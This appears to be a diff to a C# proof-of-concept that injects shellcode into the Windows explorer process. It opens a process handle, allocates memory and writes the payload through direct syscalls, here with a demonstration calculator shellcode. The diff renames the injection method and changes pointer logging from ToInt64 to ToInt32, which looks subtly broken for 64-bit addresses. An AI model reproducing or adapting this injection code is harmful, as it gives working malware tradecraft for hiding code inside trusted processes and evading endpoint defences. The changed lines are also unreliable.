@@ -25,10 +25,10 @@ namespace CreateThread_PoC
                 shellcode = Shellcode.Calc32;
             }
 
-            InjectCreateRemoteThread(shellcode);
+            InjectShellcode(shellcode);
         }
 
-        private static void InjectCreateRemoteThread(byte[] shellcode)
+        private static void InjectShellcode(byte[] shellcode)
         {
             var target = Process.GetProcessesByName("explorer")[0];
 
@@ -40,7 +40,7 @@ namespace CreateThread_PoC
                 throw new Exception("Failed to open handle");
             }
 
-            Console.WriteLine("hProcess: 0x{0:X}", hProcess.ToInt64());
+            Console.WriteLine("hProcess: 0x{0:X}", hProcess.ToInt32());
 
             var regionSize = (IntPtr)shellcode.Length;
             var hMemory = Syscalls.AllocateMemory(hProcess, regionSize);
@@ -49,7 +49,7 @@ namespace CreateThread_PoC
                 throw new Exception("Failed to allocate memory");
             }
 
-            Console.WriteLine("hMemory: 0x{0:X}", hMemory.ToInt64());
+            Console.WriteLine("hMemory: 0x{0:X}", hMemory.ToInt32());
 
             if (!Syscalls.WriteMemory(hProcess, hMemory, shellcode))
             {
